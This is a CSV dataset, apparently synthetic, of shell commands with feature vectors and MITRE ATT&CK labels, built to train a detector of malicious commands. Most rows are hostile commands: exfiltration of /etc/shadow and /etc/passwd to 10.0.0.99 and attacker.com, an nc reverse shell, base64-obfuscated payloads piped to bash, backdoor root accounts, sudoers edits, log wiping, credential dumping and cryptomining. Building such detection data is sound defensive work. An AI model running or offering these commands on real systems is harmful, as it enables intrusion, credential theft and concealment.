command,features,label,source
cat /etc/shadow | nc 10.0.0.99 4444,"[1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]",['T1041_Exfiltration_Over_C2_Channel'],synthetic
echo '@reboot /tmp/backdoor.sh' | crontab -,"[0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]",['T1053_Scheduled_Task'],synthetic
time echo 'Y3VybCAtQSAnTW96aWxsYS81LjAnIGh0dHA6Ly9jMi5hdHRhY2tlci5jb20vY2hlY2staW4=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1071_Application_Layer_Protocol', 'T1027_Obfuscated_Files_or_Information']",synthetic
time pwd,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['BENIGN'],synthetic
echo 'backdoor:x:0:0:root:/root:/bin/bash' >> /etc/passwd,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1098_Account_Manipulation'],synthetic
echo 'bHNjcHUgOyBjaG1vZCAreCAvdG1wL3BheWxvYWQ=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1082_System_Information_Discovery', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo  'Li9DVkUtMjAyMS00MDM0'  |  base64  -d  |  bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1068_Exploitation_for_Privilege_Escalation', 'T1027_Obfuscated_Files_or_Information']",synthetic
pip  install  requests,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['BENIGN'],synthetic
"python3  -c  ""exec(__import__('base64').b64decode('aW1wb3J0IG9z').decode())""  |  echo  done","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.2, 0.24, 1, 0]","['T1027_Obfuscated_Files_or_Information', 'T1059_Command_and_Scripting_Interpreter']",synthetic
wget --post-file=/etc/passwd http://attacker.com/receive,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1041_Exfiltration_Over_C2_Channel'],synthetic
sudo echo 'ZWNobyAtZSAnXHgyZlx4NjJceDY5XHg2ZVx4MmZceDYyXHg2MVx4NzNceDY4Jw==' | base64 -d | bash,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
find / -perm -4000 -type f 2>/dev/null,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.28, 0, 0]",['T1083_File_and_Directory_Discovery'],synthetic
shred -u /var/log/auth.log && sleep 1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.24, 1, 0]","['T1070_Indicator_Removal', 'T1059_Command_and_Scripting_Interpreter']",synthetic
./pwnkit,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.04, 0, 1]",['T1068_Exploitation_for_Privilege_Escalation'],synthetic
ncrack -p 22 --user root -P pass.lst 10.0.0.1,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 0, 0]",['T1110_Brute_Force'],synthetic
"bash -c ""./dirtycow /etc/passwd 'root::0:0:root:/root:/bin/bash'""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1068_Exploitation_for_Privilege_Escalation'],synthetic
nc -e /bin/bash attacker.com 80,"[0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1071_Application_Layer_Protocol'],synthetic
journalctl -u ssh --since today,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['BENIGN'],synthetic
useradd -m -s /bin/bash -G sudo newadmin,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1098_Account_Manipulation'],synthetic
sudo useradd -o -u 0 -g 0 -M -d /root -s /bin/bash ghost,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.52, 0, 0]",['T1136_Create_Account'],synthetic
uname -a,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.08, 0, 0]",['T1082_System_Information_Discovery'],synthetic
nohup find / -name '*.conf' -readable 2>/dev/null | head -20 &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.2, 0.44, 1, 0]",['T1083_File_and_Directory_Discovery'],synthetic
"bash -c ""echo 'bWltaWthdHouZXhlICdzZWt1cmxzYTo6bG9nb25wYXNzd29yZHMnIGV4aXQgOyBjaG1vZCAreCAvdG1wL3BheWxvYWQ=' | base64 -d | bash""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1003_OS_Credential_Dumping', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
sed -i 's/old/new/g' config.cfg,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['BENIGN'],synthetic
wget --post-file=/etc/passwd http://attacker.com/receive,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1041_Exfiltration_Over_C2_Channel'],synthetic
"runuser -l postgres -c 'psql -c ""SELECT pg_read_file(\'/etc/passwd\')""'","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 0, 0]",['T1078_Valid_Accounts'],synthetic
passwd -d root,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1098_Account_Manipulation'],synthetic
useradd -o -u 0 -g 0 -M -d /root -s /bin/bash ghost | > /dev/null 2>&1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.2, 0.64, 1, 0]","['T1136_Create_Account', 'T1059_Command_and_Scripting_Interpreter']",synthetic
id -Gn,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.08, 0, 0]",['T1069_Permission_Groups_Discovery'],synthetic
time find /home -name '*.conf',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['BENIGN'],synthetic
"bash -c ""echo 'Y2F0IC9ldGMvc2hhZG93IHwgbmMgMTAuMC4wLjk5IDQ0NDQ=' | base64 -d | bash""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1041_Exfiltration_Over_C2_Channel', 'T1027_Obfuscated_Files_or_Information']",synthetic
service  apache2  status,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['BENIGN'],synthetic
getent  group  sudo,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1069_Permission_Groups_Discovery'],synthetic
"bash -c ""ifconfig -a""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1016_System_Network_Config_Discovery'],synthetic
"perl -e 'eval pack q/H*/, q/7363726970742e6570732f52656d6f74652e706e67/'","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
nohup nmap -sV --version-intensity 5 -p 1-65535 10.0.0.1 &,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.36, 0, 0]",['T1046_Network_Service_Scanning'],synthetic
ip link show && history -c,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.24, 1, 0]","['T1016_System_Network_Config_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
time nmap -A -T4 192.168.1.0/24,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.2, 0, 0]",['T1046_Network_Service_Scanning'],synthetic
cat /etc/os-release | echo done,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.2, 1, 0]","['T1082_System_Information_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'aXAgcm91dGUgc2hvdw==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1016_System_Network_Config_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
time usermod -aG sudo compromised_user,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1098_Account_Manipulation'],synthetic
echo  'aGVsbG8='  |  base64  -d  |  bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
echo 'c2hyZWQgLXUgL3Zhci9sb2cvYXV0aC5sb2cgfCBjaG1vZCAreCAvdG1wL3BheWxvYWQ=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1070_Indicator_Removal', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
find /home -name '*.conf',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['BENIGN'],synthetic
sudo echo 'Y2F0IC9ldGMvbmV0d29yay9pbnRlcmZhY2VzIHwgaGlzdG9yeSAtYw==' | base64 -d | bash,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1016_System_Network_Config_Discovery', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo 'cmVnIGRlbGV0ZSBIS0xNXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFJ1biAvdiBEZWZlbmRlcg==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1112_Modify_Registry', 'T1027_Obfuscated_Files_or_Information']",synthetic
"nmap -sV -p 22,80,443 10.0.0.0/24","[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.2, 0, 0]",['T1018_Remote_System_Discovery'],synthetic
echo 'aXAgcm91dGUgc2hvdyAmJiBoaXN0b3J5IC1j' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1016_System_Network_Config_Discovery', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
time echo 'dGZ0cCAtaSAxMC4wLjAuOTkgR0VUIHBheWxvYWQuZXhlIEM6XFdpbmRvd3NcVGVtcFxwYXlsb2FkLmV4ZQ==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1105_Ingress_Tool_Transfer', 'T1027_Obfuscated_Files_or_Information']",synthetic
time echo 'bm1hcCAtc1YgLS12ZXJzaW9uLWludGVuc2l0eSA1IC1wIDEtNjU1MzUgMTAuMC4wLjE=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1046_Network_Service_Scanning', 'T1027_Obfuscated_Files_or_Information']",synthetic
"bash -c ""nmap -sV -p 22,80,443 10.0.0.0/24""","[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.28, 0, 0]",['T1018_Remote_System_Discovery'],synthetic
nohup nohup ./xmrig --url stratum+tcp://pool.minexmr.com:443 --user wallet & &,"[0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.36, 0, 0]",['T1496_Resource_Hijacking'],synthetic
nohup ./xmrig --url stratum+tcp://pool.minexmr.com:443 --user wallet &,"[0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1496_Resource_Hijacking'],synthetic
echo 'c3lzdGVtY3RsIGVuYWJsZSAtLW5vdyBtYWxpY2lvdXMuc2VydmljZQ==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1053_Scheduled_Task', 'T1027_Obfuscated_Files_or_Information']",synthetic
time wmic useraccount list ; history -c,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.28, 1, 0]","['T1087_Account_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
time echo 'cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zOy4uLic=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
procdump.exe -ma lsass.exe lsass.dmp,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1003_OS_Credential_Dumping'],synthetic
su  -  admin,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1078_Valid_Accounts'],synthetic
cat /etc/passwd | awk -F: '$3 >= 1000',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]",['T1087_Account_Discovery'],synthetic
./dirtycow /etc/passwd 'root::0:0:root:/root:/bin/bash' | > /dev/null 2>&1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.2, 0.28, 1, 1]","['T1068_Exploitation_for_Privilege_Escalation', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nohup xfreerdp /u:Administrator /p:Password123 /v:10.0.0.5 | > /dev/null 2>&1 &,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.2, 0.4, 1, 0]","['T1021_Remote_Services', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"bash -c ""curl -A 'Mozilla/5.0' http://c2.attacker.com/check-in""","[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1071_Application_Layer_Protocol'],synthetic
nohup echo '' > /var/log/syslog &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1070_Indicator_Removal'],synthetic
nmap -A -T4 192.168.1.0/24 ; > /dev/null 2>&1,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 0, 0.0, 0.32, 1, 0]","['T1046_Network_Service_Scanning', 'T1059_Command_and_Scripting_Interpreter']",synthetic
cat /etc/passwd | awk -F: '$3 >= 1000',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]",['T1087_Account_Discovery'],synthetic
time systemctl restart nginx,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['BENIGN'],synthetic
net localgroup administrators,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1069_Permission_Groups_Discovery'],synthetic
ps aux | grep nginx,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.2, 0.2, 1, 0]",['BENIGN'],synthetic
for p in $(cat passwords.txt); do sshpass -p $p ssh root@10.0.0.1 id; done,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.52, 0, 0]",['T1110_Brute_Force'],synthetic
echo 'compromised ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1098_Account_Manipulation'],synthetic
su -s /bin/bash www-data | sleep 1,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.28, 1, 0]","['T1078_Valid_Accounts', 'T1059_Command_and_Scripting_Interpreter']",synthetic
secretsdump.py -just-dc-user Administrator domain/user:pass@DC && history -c,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.28, 1, 0]","['T1003_OS_Credential_Dumping', 'T1059_Command_and_Scripting_Interpreter']",synthetic
find / -name 'id_rsa' 2>/dev/null,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.2, 0, 0]",['T1003_OS_Credential_Dumping'],synthetic
echo 'bmMgLXp2IDEwLjAuMC4xIDEtMTAwMCAyPiYxIHwgZ3JlcCBzdWNjZWVkZWQ=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1046_Network_Service_Scanning', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo 'd21pZXhlYy5weSBkb21haW4vYWRtaW46cGFzc0AxMC4wLjAuNQ==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1021_Remote_Services', 'T1027_Obfuscated_Files_or_Information']",synthetic
time uname -a && sleep 1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.24, 1, 0]","['T1082_System_Information_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
New-ItemProperty -Path 'HKLM:\...' -Name Persist -Value 'C:\payload.exe' && > /dev/null 2>&1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.44, 1, 0]","['T1112_Modify_Registry', 'T1059_Command_and_Scripting_Interpreter']",synthetic
